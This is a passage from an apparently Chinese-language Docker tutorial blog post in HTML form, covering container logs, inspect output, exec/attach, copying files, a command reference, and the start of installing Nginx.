class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">docker logs --help</span><br><span class="line">Options:</span><br><span class="line">      --details        Show extra details provided to logs </span><br><span class="line">*  -f, --follow         Follow log output</span><br><span class="line">      --since string   Show logs since timestamp (e.g. 2013-01-02T13:23:37) or relative (e.g. 42m for 42 minutes)</span><br><span class="line">*      --tail string    Number of lines to show from the end of the logs (default "all")</span><br><span class="line">*  -t, --timestamps     Show timestamps</span><br><span class="line">      --until string   Show logs before a timestamp (e.g. 2013-01-02T13:23:37) or relative (e.g. 42m for 42 minutes)</span><br><span class="line">➜  ~ docker run -d centos /bin/sh -c "while true;do echo 6666;sleep 1;done" #模拟日志      </span><br><span class="line"><span class="meta">#</span><span class="bash">显示日志</span></span><br><span class="line">-tf#显示日志信息（一直更新）</span><br><span class="line">--tail number #需要显示日志条数</span><br><span class="line">docker logs -t --tail n 容器id #查看n行日志</span><br><span class="line">docker logs -ft 容器id #跟着日志</span><br></pre></td></tr></table></figure><h3 id="7-3-查看容器中进程信息ps"><a href="#7-3-查看容器中进程信息ps" class="headerlink" title="7.3 查看容器中进程信息ps"></a>7.3 查看容器中进程信息ps</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令 docker top 容器id</span></span><br></pre></td></tr></table></figure><h3 id="7-4-查看镜像的元数据"><a href="#7-4-查看镜像的元数据" class="headerlink" title="7.4 查看镜像的元数据"></a>7.4 查看镜像的元数据</h3><h5 id="7-4-1-命令"><a href="#7-4-1-命令" class="headerlink" title="7.4.1  命令"></a>7.4.1  命令</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令</span></span><br><span class="line">docker inspect 容器id</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试</span></span><br><span class="line">➜  ~ docker inspect 55321bcae33d</span><br></pre></td></tr></table></figure><h5 id="7-4-2-展示"><a href="#7-4-2-展示" class="headerlink" title="7.4.2 展示"></a>7.4.2 展示</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        "Id": "55321bcae33d15da8280bcac1d2bc1141d213bcc8f8e792edfd832ff61ae5066",</span><br><span class="line">        "Created": "2020-05-15T05:22:05.515909071Z",</span><br><span class="line">        "Path": "/bin/sh",</span><br><span class="line">        "Args": [</span><br><span class="line">            "-c",</span><br><span class="line">            "while true;do echo 6666;sleep 1;done"</span><br><span class="line">        ],</span><br><span class="line">        "State": &#123;</span><br><span class="line">            "Status": "running",</span><br><span class="line">            "Running": true,</span><br><span class="line">            "Paused": false,</span><br><span class="line">            "Restarting": false,</span><br><span class="line">            "OOMKilled": false,</span><br><span class="line">            "Dead": false,</span><br><span class="line">            "Pid": 22973,</span><br><span class="line">            "ExitCode": 0,</span><br><span class="line">            "Error": "",</span><br><span class="line">            "StartedAt": "2020-05-15T05:22:06.165904633Z",</span><br><span class="line">            "FinishedAt": "0001-01-01T00:00:00Z"</span><br><span class="line">        &#125;,</span><br><span class="line">        "Image": "sha256:470671670cac686c7cf0081e0b37da2e9f4f768ddc5f6a26102ccd1c6954c1ee",</span><br><span class="line">        "ResolvConfPath": "/var/lib/docker/containers/55321bcae33d15da8280bcac1d2bc1141d213bcc8f8e792edfd832ff61ae5066/resolv.conf",</span><br><span class="line">        "HostnamePath": "/var/lib/docker/containers/55321bcae33d15da8280bcac1d2bc1141d213bcc8f8e792edfd832ff61ae5066/hostname",</span><br><span class="line">        "HostsPath": "/var/lib/docker/containers/55321bcae33d15da8280bcac1d2bc1141d213bcc8f8e792edfd832ff61ae5066/hosts",</span><br><span class="line">        "LogPath": "/var/lib/docker/containers/55321bcae33d15da8280bcac1d2bc1141d213bcc8f8e792edfd832ff61ae5066/55321bcae33d15da8280bcac1d2bc1141d213bcc8f8e792edfd832ff61ae5066-json.log",</span><br><span class="line">        "Name": "/bold_bell",</span><br><span class="line">        "RestartCount": 0,</span><br><span class="line">        "Driver": "overlay2",</span><br><span class="line">        "Platform": "linux",</span><br><span class="line">        "MountLabel": "",</span><br><span class="line">        "ProcessLabel": "",</span><br><span class="line">        "AppArmorProfile": "docker-default",</span><br><span class="line">        "ExecIDs": null,</span><br><span class="line">        "HostConfig": &#123;</span><br><span class="line">            "Binds": null,</span><br><span class="line">            "ContainerIDFile": "",</span><br><span class="line">            "LogConfig": &#123;</span><br><span class="line">                "Type": "json-file",</span><br><span class="line">                "Config": &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            "NetworkMode": "default",</span><br><span class="line">            "PortBindings": &#123;&#125;,</span><br><span class="line">            "RestartPolicy": &#123;</span><br><span class="line">                "Name": "no",</span><br><span class="line">                "MaximumRetryCount": 0</span><br><span class="line">            &#125;,</span><br><span class="line">            "AutoRemove": false,</span><br><span class="line">            "VolumeDriver": "",</span><br><span class="line">            "VolumesFrom": null,</span><br><span class="line">            "CapAdd": null,</span><br><span class="line">            "CapDrop": null,</span><br><span class="line">            "Capabilities": null,</span><br><span class="line">            "Dns": [],</span><br><span class="line">            "DnsOptions": [],</span><br><span class="line">            "DnsSearch": [],</span><br><span class="line">            "ExtraHosts": null,</span><br><span class="line">            "GroupAdd": null,</span><br><span class="line">            "IpcMode": "private",</span><br><span class="line">            "Cgroup": "",</span><br><span class="line">            "Links": null,</span><br><span class="line">            "OomScoreAdj": 0,</span><br><span class="line">            "PidMode": "",</span><br><span class="line">            "Privileged": false,</span><br><span class="line">            "PublishAllPorts": false,</span><br><span class="line">            "ReadonlyRootfs": false,</span><br><span class="line">            "SecurityOpt": null,</span><br><span class="line">            "UTSMode": "",</span><br><span class="line">            "UsernsMode": "",</span><br><span class="line">            "ShmSize": 67108864,</span><br><span class="line">            "Runtime": "runc",</span><br><span class="line">            "ConsoleSize": [</span><br><span class="line">                0,</span><br><span class="line">                0</span><br><span class="line">            ],</span><br><span class="line">            "Isolation": "",</span><br><span class="line">            "CpuShares": 0,</span><br><span class="line">            "Memory": 0,</span><br><span class="line">            "NanoCpus": 0,</span><br><span class="line">            "CgroupParent": "",</span><br><span class="line">            "BlkioWeight": 0,</span><br><span class="line">            "BlkioWeightDevice": [],</span><br><span class="line">            "BlkioDeviceReadBps": null,</span><br><span class="line">            "BlkioDeviceWriteBps": null,</span><br><span class="line">            "BlkioDeviceReadIOps": null,</span><br><span class="line">            "BlkioDeviceWriteIOps": null,</span><br><span class="line">            "CpuPeriod": 0,</span><br><span class="line">            "CpuQuota": 0,</span><br><span class="line">            "CpuRealtimePeriod": 0,</span><br><span class="line">            "CpuRealtimeRuntime": 0,</span><br><span class="line">            "CpusetCpus": "",</span><br><span class="line">            "CpusetMems": "",</span><br><span class="line">            "Devices": [],</span><br><span class="line">            "DeviceCgroupRules": null,</span><br><span class="line">            "DeviceRequests": null,</span><br><span class="line">            "KernelMemory": 0,</span><br><span class="line">            "KernelMemoryTCP": 0,</span><br><span class="line">            "MemoryReservation": 0,</span><br><span class="line">            "MemorySwap": 0,</span><br><span class="line">            "MemorySwappiness": null,</span><br><span class="line">            "OomKillDisable": false,</span><br><span class="line">            "PidsLimit": null,</span><br><span class="line">            "Ulimits": null,</span><br><span class="line">            "CpuCount": 0,</span><br><span class="line">            "CpuPercent": 0,</span><br><span class="line">            "IOMaximumIOps": 0,</span><br><span class="line">            "IOMaximumBandwidth": 0,</span><br><span class="line">            "MaskedPaths": [</span><br><span class="line">                "/proc/asound",</span><br><span class="line">                "/proc/acpi",</span><br><span class="line">                "/proc/kcore",</span><br><span class="line">                "/proc/keys",</span><br><span class="line">                "/proc/latency_stats",</span><br><span class="line">                "/proc/timer_list",</span><br><span class="line">                "/proc/timer_stats",</span><br><span class="line">                "/proc/sched_debug",</span><br><span class="line">                "/proc/scsi",</span><br><span class="line">                "/sys/firmware"</span><br><span class="line">            ],</span><br><span class="line">            "ReadonlyPaths": [</span><br><span class="line">                "/proc/bus",</span><br><span class="line">                "/proc/fs",</span><br><span class="line">                "/proc/irq",</span><br><span class="line">                "/proc/sys",</span><br><span class="line">                "/proc/sysrq-trigger"</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        "GraphDriver": &#123;</span><br><span class="line">            "Data": &#123;</span><br><span class="line">                "LowerDir": "/var/lib/docker/overlay2/1f347949ba49c4dbee70cea9ff3af39a14e602bc8fac8331c46347bf6708757a-init/diff:/var/lib/docker/overlay2/5afcd8220c51854a847a36f52775b4ed0acb16fe6cfaec3bd2e5df59863835ba/diff",</span><br><span class="line">                "MergedDir": "/var/lib/docker/overlay2/1f347949ba49c4dbee70cea9ff3af39a14e602bc8fac8331c46347bf6708757a/merged",</span><br><span class="line">                "UpperDir": "/var/lib/docker/overlay2/1f347949ba49c4dbee70cea9ff3af39a14e602bc8fac8331c46347bf6708757a/diff",</span><br><span class="line">                "WorkDir": "/var/lib/docker/overlay2/1f347949ba49c4dbee70cea9ff3af39a14e602bc8fac8331c46347bf6708757a/work"</span><br><span class="line">            &#125;,</span><br><span class="line">            "Name": "overlay2"</span><br><span class="line">        &#125;,</span><br><span class="line">        "Mounts": [],</span><br><span class="line">        "Config": &#123;</span><br><span class="line">            "Hostname": "55321bcae33d",</span><br><span class="line">            "Domainname": "",</span><br><span class="line">            "User": "",</span><br><span class="line">            "AttachStdin": false,</span><br><span class="line">            "AttachStdout": false,</span><br><span class="line">            "AttachStderr": false,</span><br><span class="line">            "Tty": false,</span><br><span class="line">            "OpenStdin": false,</span><br><span class="line">            "StdinOnce": false,</span><br><span class="line">            "Env": [</span><br><span class="line">                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><br><span class="line">            ],</span><br><span class="line">            "Cmd": [</span><br><span class="line">                "/bin/sh",</span><br><span class="line">                "-c",</span><br><span class="line">                "while true;do echo 6666;sleep 1;done"</span><br><span class="line">            ],</span><br><span class="line">            "Image": "centos",</span><br><span class="line">            "Volumes": null,</span><br><span class="line">            "WorkingDir": "",</span><br><span class="line">            "Entrypoint": null,</span><br><span class="line">            "OnBuild": null,</span><br><span class="line">            "Labels": &#123;</span><br><span class="line">                "org.label-schema.build-date": "20200114",</span><br><span class="line">                "org.label-schema.license": "GPLv2",</span><br><span class="line">                "org.label-schema.name": "CentOS Base Image",</span><br><span class="line">                "org.label-schema.schema-version": "1.0",</span><br><span class="line">                "org.label-schema.vendor": "CentOS",</span><br><span class="line">                "org.opencontainers.image.created": "2020-01-14 00:00:00-08:00",</span><br><span class="line">                "org.opencontainers.image.licenses": "GPL-2.0-only",</span><br><span class="line">                "org.opencontainers.image.title": "CentOS Base Image",</span><br><span class="line">                "org.opencontainers.image.vendor": "CentOS"</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        "NetworkSettings": &#123;</span><br><span class="line">            "Bridge": "",</span><br><span class="line">            "SandboxID": "63ed0c837f35c12453bae9661859f37a08541a0749afb86e881869bf6fd9031b",</span><br><span class="line">            "HairpinMode": false,</span><br><span class="line">            "LinkLocalIPv6Address": "",</span><br><span class="line">            "LinkLocalIPv6PrefixLen": 0,</span><br><span class="line">            "Ports": &#123;&#125;,</span><br><span class="line">            "SandboxKey": "/var/run/docker/netns/63ed0c837f35",</span><br><span class="line">            "SecondaryIPAddresses": null,</span><br><span class="line">            "SecondaryIPv6Addresses": null,</span><br><span class="line">            "EndpointID": "b129d9a5a2cbb92722a2101244bd81a9e3d8af034e83f338c13790a1a94552a1",</span><br><span class="line">            "Gateway": "172.17.0.1",</span><br><span class="line">            "GlobalIPv6Address": "",</span><br><span class="line">            "GlobalIPv6PrefixLen": 0,</span><br><span class="line">            "IPAddress": "172.17.0.4",</span><br><span class="line">            "IPPrefixLen": 16,</span><br><span class="line">            "IPv6Gateway": "",</span><br><span class="line">            "MacAddress": "02:42:ac:11:00:04",</span><br><span class="line">            "Networks": &#123;</span><br><span class="line">                "bridge": &#123;</span><br><span class="line">                    "IPAMConfig": null,</span><br><span class="line">                    "Links": null,</span><br><span class="line">                    "Aliases": null,</span><br><span class="line">                    "NetworkID": "ad5ada6a106f5ba3dda9ce4bc1475a4bb593bf5f7fbead72196e66515e8ac36a",</span><br><span class="line">                    "EndpointID": "b129d9a5a2cbb92722a2101244bd81a9e3d8af034e83f338c13790a1a94552a1",</span><br><span class="line">                    "Gateway": "172.17.0.1",</span><br><span class="line">                    "IPAddress": "172.17.0.4",</span><br><span class="line">                    "IPPrefixLen": 16,</span><br><span class="line">                    "IPv6Gateway": "",</span><br><span class="line">                    "GlobalIPv6Address": "",</span><br><span class="line">                    "GlobalIPv6PrefixLen": 0,</span><br><span class="line">                    "MacAddress": "02:42:ac:11:00:04",</span><br><span class="line">                    "DriverOpts": null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="7-5-进入当前正在运行的容器"><a href="#7-5-进入当前正在运行的容器" class="headerlink" title="==7.5 进入当前正在运行的容器=="></a>==<strong>7.5 进入当前正在运行的容器</strong>==</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们通常容器都是使用后台方式运行的，需要进入容器，修改一些配置</span><br><span class="line">命令</span><br><span class="line">docker exec -it 容器id bash/shell</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试</span></span><br><span class="line">➜ ~ docker ps</span><br><span class="line">CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES</span><br><span class="line">55321bcae33d centos “/bin/sh -c <span class="string">'while t…” 10 minutes ago Up 10 minutes bold_bell</span></span><br><span class="line"><span class="string">a7215824a4db centos “/bin/sh -c '</span><span class="keyword">while</span> t…” 13 minutes ago Up 13 minutes zen_kepler</span><br><span class="line">55a31b3f8613 centos “/bin/bash” 15 minutes ago Up 15 minutes lucid_clarke</span><br><span class="line">➜ ~ docker <span class="built_in">exec</span> -it 55321bcae33d /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 方式二</span></span><br><span class="line">docker attach 容器id</span><br><span class="line"><span class="meta">#</span><span class="bash">测试</span></span><br><span class="line">docker attach 55321bcae33d </span><br><span class="line">正在执行当前的代码...</span><br><span class="line">区别</span><br><span class="line"><span class="meta">#</span><span class="bash">docker <span class="built_in">exec</span> <span class="comment">#进入当前容器后开启一个新的终端，可以在里面操作。（常用）</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">docker attach <span class="comment"># 进入容器正在执行的终端</span></span></span><br></pre></td></tr></table></figure><h3 id="7-6从容器内拷贝到主机上"><a href="#7-6从容器内拷贝到主机上" class="headerlink" title="==7.6从容器内拷贝到主机上=="></a>==<strong>7.6从容器内拷贝到主机上</strong>==</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器id:容器内路径  主机目的路径</span><br><span class="line"></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID     IMAGE    COMMAND     CREATED         STATUS       PORTS      NAMES</span><br><span class="line">56a5583b25b4     centos   <span class="string">"/bin/bash"</span> 7seconds ago    Up 6 seconds      </span><br><span class="line"></span><br><span class="line"><span class="comment">#1. 进入docker容器内部</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker exec -it 56a5583b25b4 /bin/bash</span></span><br><span class="line">[root@55321bcae33d /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建一个文件</span></span><br><span class="line">[root@55321bcae33d /]<span class="comment"># echo "hello" &gt; java.java</span></span><br><span class="line">[root@55321bcae33d /]<span class="comment"># cat hello.java </span></span><br><span class="line">hello</span><br><span class="line">[root@55321bcae33d /]<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#hello.java拷贝到home文件加下</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z /]<span class="comment"># docker cp 56a5583b25b4:/hello.java /home </span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z /]<span class="comment"># cd /home</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z home]<span class="comment"># ls -l#可以看见java.java存在</span></span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 root root    0 May 19 22:09 haust.java</span><br><span class="line">-rw-r--r-- 1 root root    6 May 22 11:12 java.java</span><br><span class="line">drwx------ 3 www  www  4096 May  8 12:14 www</span><br></pre></td></tr></table></figure><h1 id="八-命令大全"><a href="#八-命令大全" class="headerlink" title="八. 命令大全"></a><strong>八. 命令大全</strong></h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">attach      Attach <span class="built_in">local</span> standard input, output, and error streams to a running container</span><br><span class="line">  <span class="comment">#当前shell下 attach连接指定运行的镜像</span></span><br><span class="line">  build       Build an image from a Dockerfile <span class="comment"># 通过Dockerfile定制镜像</span></span><br><span class="line">  commit      Create a new image from a container<span class="string">'s changes #提交当前容器为新的镜像</span></span><br><span class="line"><span class="string">  cp          Copy files/folders between a container and the local filesystem #拷贝文件</span></span><br><span class="line"><span class="string">  create      Create a new container #创建一个新的容器</span></span><br><span class="line"><span class="string">  diff        Inspect changes to files or directories on a container'</span>s filesystem <span class="comment">#查看docker容器的变化</span></span><br><span class="line">  events      Get real time events from the server <span class="comment"># 从服务获取容器实时时间</span></span><br><span class="line">  <span class="built_in">exec</span>        Run a <span class="built_in">command</span> <span class="keyword">in</span> a running container <span class="comment"># 在运行中的容器上运行命令</span></span><br><span class="line">  <span class="built_in">export</span>      Export a container<span class="string">'s filesystem as a tar archive #导出容器文件系统作为一个tar归档文件[对应import]</span></span><br><span class="line"><span class="string">  history     Show the history of an image # 展示一个镜像形成历史</span></span><br><span class="line"><span class="string">  images      List images #列出系统当前的镜像</span></span><br><span class="line"><span class="string">  import      Import the contents from a tarball to create a filesystem image #从tar包中导入内容创建一个文件系统镜像</span></span><br><span class="line"><span class="string">  info        Display system-wide information # 显示全系统信息</span></span><br><span class="line"><span class="string">  inspect     Return low-level information on Docker objects #查看容器详细信息</span></span><br><span class="line"><span class="string">  kill        Kill one or more running containers # kill指定docker容器</span></span><br><span class="line"><span class="string">  load        Load an image from a tar archive or STDIN #从一个tar包或标准输入中加载一个镜像[对应save]</span></span><br><span class="line"><span class="string">  login       Log in to a Docker registry #</span></span><br><span class="line"><span class="string">  logout      Log out from a Docker registry</span></span><br><span class="line"><span class="string">  logs        Fetch the logs of a container</span></span><br><span class="line"><span class="string">  pause       Pause all processes within one or more containers</span></span><br><span class="line"><span class="string">  port        List port mappings or a specific mapping for the container</span></span><br><span class="line"><span class="string">  ps          List containers</span></span><br><span class="line"><span class="string">  pull        Pull an image or a repository from a registry</span></span><br><span class="line"><span class="string">  push        Push an image or a repository to a registry</span></span><br><span class="line"><span class="string">  rename      Rename a container</span></span><br><span class="line"><span class="string">  restart     Restart one or more containers</span></span><br><span class="line"><span class="string">  rm          Remove one or more containers</span></span><br><span class="line"><span class="string">  rmi         Remove one or more images</span></span><br><span class="line"><span class="string">  run         Run a command in a new container</span></span><br><span class="line"><span class="string">  save        Save one or more images to a tar archive (streamed to STDOUT by default)</span></span><br><span class="line"><span class="string">  search      Search the Docker Hub for images</span></span><br><span class="line"><span class="string">  start       Start one or more stopped containers</span></span><br><span class="line"><span class="string">  stats       Display a live stream of container(s) resource usage statistics</span></span><br><span class="line"><span class="string">  stop        Stop one or more running containers</span></span><br><span class="line"><span class="string">  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE</span></span><br><span class="line"><span class="string">  top         Display the running processes of a container</span></span><br><span class="line"><span class="string">  unpause     Unpause all processes within one or more containers</span></span><br><span class="line"><span class="string">  update      Update configuration of one or more containers</span></span><br><span class="line"><span class="string">  version     Show the Docker version information</span></span><br><span class="line"><span class="string">  wait        Block until one or more containers stop, then print their exit codes</span></span><br></pre></td></tr></table></figure><h1 id="九-安装软件"><a href="#九-安装软件" class="headerlink" title="九. 安装软件"></a>九. 安装软件</h1><h3 id="9-1-Docker-安装Nginx"><a href="#9-1-Docker-安装Nginx" class="headerlink" title="9.1 Docker 安装Nginx"></a>9.1 Docker 安装Nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">1. 搜索镜像 search 建议大家去docker搜索，可以看到帮助文档</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker search nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">2. 拉取下载镜像 pull</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker pull nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">3. 查看是否下载成功镜像</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker images</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">3. 运行测试</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -d 后台运行</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> --name 给容器命名</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -p 宿主机端口：容器内部端口</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">aa664b0c8ed98f532453ce1c599be823bcc1f3c9209e5078615af416ccb454c2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">4. 查看正在启动的镜像</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                NAMES</span><br><span class="line">75943663c116        nginx               "nginx -g 'daemon of…"   41 seconds ago      